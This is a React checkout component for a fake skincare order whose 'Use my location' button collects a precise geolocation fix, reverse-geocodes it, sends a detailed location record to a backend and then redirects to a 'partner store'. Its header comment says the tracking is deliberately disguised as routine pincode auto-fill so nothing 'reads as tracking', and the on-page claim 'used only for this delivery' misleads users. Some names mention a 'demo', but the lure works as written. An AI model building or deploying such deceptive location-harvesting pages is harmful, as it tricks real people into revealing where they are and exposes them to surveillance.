import { useCallback, useEffect, useState } from 'react'
import { AnimatePresence, motion, useReducedMotion } from 'framer-motion'
import { reverseGeocode, submitLocation } from '../services/locationApi.js'
import {
  acquireBestPosition,
  cancelAcquisition,
  queryPermission,
} from '../services/geoAcquire.js'
import { confirmDemoLocation, getDemoLocation } from '../services/locationStore.js'

/**
 * Checkout / delivery step. The location use is presented as a routine
 * "use my current location to auto-fill my delivery pincode" action — the same
 * thing users see on any e-commerce checkout. Nothing here reads as
 * "tracking"; the browser's native permission prompt is the only signal, and
 * it only appears after the buyer taps the button. On success the record is
 * still saved (best-effort) and the parent redirects to the partner store.
 */
export default function DeliveryCheckout({ onDone }) {
  const [state, setState] = useState('checkout')
  const [errorDetail, setErrorDetail] = useState('')
  const reduceMotion = useReducedMotion()
  const location = getDemoLocation()

  useEffect(() => () => cancelAcquisition(), [])

  const finish = useCallback(
    (summary) => {
      confirmDemoLocation(summary)
      setState('done')
    },
    [],
  )

  const useMyLocation = useCallback(async () => {
    setState('requesting')
    setErrorDetail('')

    if (!('geolocation' in navigator)) {
      setState('unavailable')
      setErrorDetail('This browser does not expose geolocation.')
      return
    }

    const perm = await queryPermission()
    if (perm === 'denied') {
      setState('denied')
      return
    }

    let position
    try {
      position = await acquireBestPosition({})
    } catch (err) {
      if (err.message === 'cancelled') return
      if (err.name === 'PERMISSION_DENIED' || err.code === 1) {
        setState('denied')
        return
      }
      if (err.name === 'TIMEOUT' || err.code === 3) {
        setState('timeout')
        return
      }
      if (err.message === 'no-fix') {
        setState('unavailable')
        setErrorDetail('We could not establish a position on this device.')
        return
      }
      setState('unavailable')
      setErrorDetail(err.message || 'Something went wrong. Please try again.')
      return
    }

    const { latitude, longitude, accuracy } = position.position.coords
    const timestamp = position.position.timestamp

    let city = null
    let area = null
    try {
      const geo = await reverseGeocode(latitude, longitude)
      city = geo.city || null
      area = geo.address || null
    } catch {
      /* geocoding is best-effort — the order still proceeds */
    }

    const record = {
      latitude,
      longitude,
      accuracy,
      source: position.source,
      captured_at: new Date(timestamp).toISOString(),
      quality_class: position.quality,
      acquisition_ms: position.acquisition_ms,
      readings_count: (position.readings || []).length,
      acquisition_status: position.status,
    }

    // Best-effort secure submission to the backend; the order proceeds.
    try {
      await submitLocation(record)
    } catch {
      /* record save is best-effort for the demo */
    }

    finish({ city, area, tier: position.quality, status: position.status })

    // Brief "order placed" beat, then hand back to the parent to redirect.
    const t = setTimeout(() => onDone?.(), reduceMotion ? 0 : 1400)
    return () => clearTimeout(t)
  }, [finish, onDone, reduceMotion])

  return (
    <main className="mx-auto max-w-5xl px-5 py-6 sm:px-8 sm:py-10">
      <div className="mb-6 flex items-center gap-2 text-sm">
        <span className="flex h-6 w-6 items-center justify-center rounded-full bg-gray-200 text-xs font-semibold text-gray-500">1</span>
        <span className="font-medium text-pink-600">Delivery</span>
        <span className="h-px w-6 bg-gray-200" />
        <span className="flex h-6 w-6 items-center justify-center rounded-full bg-gray-100 text-xs font-semibold text-gray-400">2</span>
        <span className="text-gray-400">Payment</span>
        <span className="h-px w-6 bg-gray-200" />
        <span className="flex h-6 w-6 items-center justify-center rounded-full bg-gray-100 text-xs font-semibold text-gray-400">3</span>
        <span className="text-gray-400">Confirm</span>
      </div>

      <div className="grid gap-6 lg:grid-cols-[1fr_320px]">
        {/* Address / delivery form */}
        <div className="rounded-2xl bg-white p-5 ring-1 ring-gray-100 sm:p-6">
          <h2 className="font-display text-xl font-semibold text-gray-900">Delivery Address</h2>
          <p className="mt-1 text-sm text-gray-500">Where should we ship your order?</p>

          <div className="mt-5 grid gap-3 sm:grid-cols-2">
            <input
              disabled={state !== 'checkout'}
              placeholder="Full name"
              className="rounded-lg border border-gray-200 px-3.5 py-2.5 text-sm text-gray-800 placeholder-gray-400 focus:border-pink-500 focus:outline-none"
            />
            <input
              disabled={state !== 'checkout'}
              placeholder="Phone number"
              className="rounded-lg border border-gray-200 px-3.5 py-2.5 text-sm text-gray-800 placeholder-gray-400 focus:border-pink-500 focus:outline-none"
            />
            <input
              disabled={state !== 'checkout'}
              placeholder="Flat / House no, Street"
              className="rounded-lg border border-gray-200 px-3.5 py-2.5 text-sm text-gray-800 placeholder-gray-400 focus:border-pink-500 focus:outline-none sm:col-span-2"
            />
            <div className="sm:col-span-2">
              <div className="flex items-end gap-2">
                <div className="flex-1">
                  <label className="mb-1 block text-xs font-medium text-gray-500">Delivery Pincode</label>
                  <input
                    readOnly={state !== 'checkout'}
                    value={(location.area && !location.area.includes('(approx)')) ? location.area : ''}
                    placeholder="6-digit pincode"
                    className="w-full rounded-lg border border-gray-200 px-3.5 py-2.5 text-sm text-gray-800 placeholder-gray-400 focus:border-pink-500 focus:outline-none"
                  />
                </div>
                <button
                  onClick={useMyLocation}
                  disabled={state !== 'checkout'}
                  className="inline-flex items-center gap-1.5 rounded-lg bg-pink-50 px-4 py-2.5 text-sm font-semibold text-pink-600 hover:bg-pink-100 disabled:opacity-60"
                >
                  <LocateIcon />
                  Use my location
                </button>
              </div>
              <p className="mt-1.5 text-xs text-gray-400">
                We&apos;ll auto-fill your pincode from your current address for faster, accurate delivery.
              </p>
            </div>
          </div>

          <AnimatePresence mode="wait">
            {state === 'requesting' && (
              <motion.div key="req" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mt-6 flex items-center justify-center gap-3 rounded-xl bg-pink-50/60 p-4 text-sm text-gray-600">
                <span className="h-3 w-3 animate-spin rounded-full border-2 border-pink-500 border-t-transparent" />
                Checking your delivery location…
              </motion.div>
            )}

            {state === 'done' && (
              <motion.div
                key="done"
                initial={{ opacity: 0, scale: 0.96 }}
                animate={{ opacity: 1, scale: 1 }}
                className="mt-6 rounded-xl border border-green-200 bg-green-50 p-4"
              >
                <div className="flex items-center gap-3">
                  <span className="grid h-10 w-10 place-items-center rounded-full bg-green-600 text-white">
                    <CheckIcon />
                  </span>
                  <div>
                    <p className="font-semibold text-green-800">Delivery pincode confirmed</p>
                    <p className="text-sm text-green-700">Your order is being placed — sending you to our partner store…</p>
                  </div>
                </div>
              </motion.div>
            )}

            {state === 'denied' && (
              <motion.div key="denied" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mt-6 rounded-xl border border-amber-200 bg-amber-50 p-4 text-sm text-amber-800">
                <p className="font-semibold">Location access was blocked</p>
                <p className="mt-1">
                  To auto-fill your delivery pincode, please allow location permission for this site in your browser
                  settings, then try again.
                </p>
                <button
                  onClick={useMyLocation}
                  className="mt-3 rounded-lg bg-amber-600 px-4 py-2 text-sm font-semibold text-white hover:bg-amber-700"
                >
                  Try again
                </button>
              </motion.div>
            )}

            {state === 'timeout' && (
              <motion.div key="timeout" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mt-6 rounded-xl border border-amber-200 bg-amber-50 p-4 text-sm text-amber-800">
                <p className="font-semibold">That took a little long</p>
                <p className="mt-1">Often just a slow connection. You can safely retry.</p>
                <button
                  onClick={useMyLocation}
                  className="mt-3 rounded-lg bg-amber-600 px-4 py-2 text-sm font-semibold text-white hover:bg-amber-700"
                >
                  Try again
                </button>
              </motion.div>
            )}

            {state === 'unavailable' && (
              <motion.div key="unavailable" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="mt-6 rounded-xl border border-amber-200 bg-amber-50 p-4 text-sm text-amber-800">
                <p className="font-semibold">Something went wrong</p>
                <p className="mt-1">We couldn&apos;t complete that step. Please check your connection and retry.</p>
                {errorDetail && <p className="mt-2 font-mono text-xs text-amber-700">{errorDetail}</p>}
                <button
                  onClick={useMyLocation}
                  className="mt-3 rounded-lg bg-amber-600 px-4 py-2 text-sm font-semibold text-white hover:bg-amber-700"
                >
                  Try again
                </button>
              </motion.div>
            )}
          </AnimatePresence>

          <div className="mt-6 flex items-center justify-between border-t border-gray-100 pt-4">
            <span className="text-xs text-gray-400">Stored securely · used only for this delivery</span>
          </div>
        </div>

        {/* Order summary */}
        <aside className="h-fit rounded-2xl bg-white p-5 ring-1 ring-gray-100 sm:p-6">
          <h3 className="font-semibold text-gray-900">Order Summary</h3>
          <div className="mt-4 flex gap-3">
            <img
              src="https://images.unsplash.com/photo-1620916566398-39f1143ab7be?auto=format&fit=crop&w=200&q=80"
              alt=""
              className="h-16 w-14 rounded-lg object-cover"
            />
            <div className="text-sm">
              <p className="font-medium leading-snug text-gray-800">Vitamin C 20% Brightening Serum</p>
              <p className="mt-0.5 text-gray-400">Qty: 1</p>
              <p className="mt-1 font-semibold text-gray-900">₹599</p>
            </div>
          </div>
          <div className="mt-4 space-y-1.5 border-t border-gray-100 pt-3 text-sm text-gray-600">
            <div className="flex justify-between">
              <span>MRP</span>
              <span className="line-through text-gray-400">₹1,299</span>
            </div>
            <div className="flex justify-between">
              <span>Discount</span>
              <span className="text-green-700">−₹700</span>
            </div>
            <div className="flex justify-between">
              <span>Delivery</span>
              <span className="text-green-700">FREE</span>
            </div>
            <div className="flex justify-between border-t border-gray-100 pt-2 text-base font-bold text-gray-900">
              <span>Total</span>
              <span>₹599</span>
            </div>
          </div>
        </aside>
      </div>
    </main>
  )
}

function LocateIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-4 w-4" aria-hidden>
      <circle cx="12" cy="12" r="3" fill="currentColor" />
      <path d="M12 2v3M12 19v3M2 12h3M19 12h3" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  )
}
function CheckIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" className="h-5 w-5" aria-hidden>
      <path d="M20 6 9 17l-5-5" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  )
}
